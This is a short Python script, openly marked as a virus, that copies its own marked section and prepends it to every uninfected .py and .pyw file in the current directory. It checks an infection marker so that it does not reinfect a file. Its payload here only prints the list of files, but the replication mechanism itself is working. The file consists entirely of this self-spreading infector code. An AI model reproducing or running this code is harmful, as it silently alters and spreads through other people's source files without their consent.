### start of the virus ###
import sys, glob

code = []
virus_aree = False
with open(sys.argv[0],'r') as f:

    for line in f:
        if line == '### start of the virus ###\n':
            virus_aree = True
        if virus_aree:
            code.append(line)
        if line == '### end of the virus ###\n':
            break
python_scripts =glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script,'r') as f:
        script_code = f.readlines()
        infected = False
        for line in script_code:
            if line =='### start of the virus ###\n':
                infected = True
                break
        if not infected:
            final_code = []
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)

            with open(script,'w') as f:
                f.writelines(final_code)

# the malicious code #
print(python_scripts)

### end of the virus ###
## more normla code